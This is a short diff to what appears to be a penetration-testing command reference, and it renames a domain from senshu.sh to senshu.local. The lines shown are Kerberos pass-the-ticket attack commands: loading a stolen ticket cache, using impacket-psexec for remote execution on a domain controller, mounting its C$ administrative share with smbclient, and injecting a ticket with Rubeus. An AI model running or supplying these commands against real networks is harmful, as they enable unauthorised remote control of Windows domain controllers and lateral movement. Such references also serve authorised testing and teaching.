@@ -6,8 +6,8 @@ commands:
     cmd: |
       # Linux
       export KRB5CCNAME=ticket.ccache
-      impacket-psexec senshu.sh/sec_user@DC.senshu.sh -k -no-pass
-      smbclient //DC.senshu.sh/C$ -k --no-pass
+      impacket-psexec senshu.local/sec_user@DC.senshu.local -k -no-pass
+      smbclient //DC.senshu.local/C$ -k --no-pass
 
       # Windows
       .\Rubeus.exe ptt /ticket:ticket.kirbi
